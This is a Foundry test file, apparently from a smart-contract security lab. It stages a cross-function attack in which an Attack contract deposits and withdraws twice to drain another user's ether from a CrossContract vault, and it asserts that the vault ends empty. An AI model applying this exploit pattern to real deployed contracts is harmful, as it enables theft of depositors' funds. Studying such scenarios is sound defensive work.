// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {CrossContract} from "../src/Cross-Contract/CrossContract.sol";
import {SampleToken} from "../src/Cross-Contract/SampleToken.sol";
import {Attack} from "../src/Cross-Contract/Attack.sol";

contract CrossContractAttack is Test {
    CrossContract crossContract;
    SampleToken sampleToken;
    Attack attackContract;

    address attacker = makeAddr("Attacker");
    address user = makeAddr("user");
    address owner = makeAddr("owner");

    uint256 AMOUNT = 1 ether;

    function setUp() public {
        vm.startPrank(owner);
        crossContract = new CrossContract();
        attackContract = new Attack(crossContract, attacker);
        vm.stopPrank();

        sampleToken = crossContract.getToken();

        vm.deal(attacker, 10 ether);
        vm.deal(user, 10 ether);
    }

    function test_crossFunctionAttackScenerio() public {
        //USER MAKES DEPOSIT INTO CROSSCONTRACT CONTRACT
        vm.startPrank(user);
        crossContract.deposit{value: AMOUNT}();
        vm.stopPrank();
        assertEq(sampleToken.balanceOf(user), AMOUNT);

        // ATTACKER USES THE ATTACK CONTRACT TO MAKES DEPOSITS AND PLACE WITHDRAWAL
        uint256 startingBalance = address(attackContract).balance;
        vm.startPrank(attacker);
        attackContract.deposit{value: AMOUNT}();
        attackContract.withdraw(AMOUNT);
        vm.stopPrank();
        assertEq(address(attackContract).balance + startingBalance, AMOUNT);

        //ATTACKER WHO IS THE OWNER WITHDRAWS EXTRA BALANCE WHICH IS NOT HIS
        vm.prank(attacker);
        attackContract.withdraw(AMOUNT);
        assertEq(address(crossContract).balance, 0);
    }
}